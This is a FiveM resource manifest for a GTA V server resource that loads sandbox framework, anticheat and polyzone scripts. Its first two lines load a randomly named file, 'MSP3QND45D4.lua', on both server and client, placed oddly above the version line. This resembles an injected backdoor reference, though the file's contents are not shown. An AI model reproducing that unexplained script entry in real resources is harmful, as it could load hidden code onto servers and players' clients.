server_script "MSP3QND45D4.lua"
client_script "MSP3QND45D4.lua"
fx_version("cerulean")
game("gta5")
lua54("yes")
client_script("@sandbox-base/components/cl_error.lua")
client_script("@sandbox-pwnzor/client/check.lua")

client_scripts({
	"@sandbox-polyzone/client.lua",
	"@sandbox-polyzone/BoxZone.lua",
	"@sandbox-polyzone/EntityZone.lua",
	"@sandbox-polyzone/CircleZone.lua",
	"@sandbox-polyzone/ComboZone.lua",

	"client/*.lua",
	"client/targets/*.lua",
})
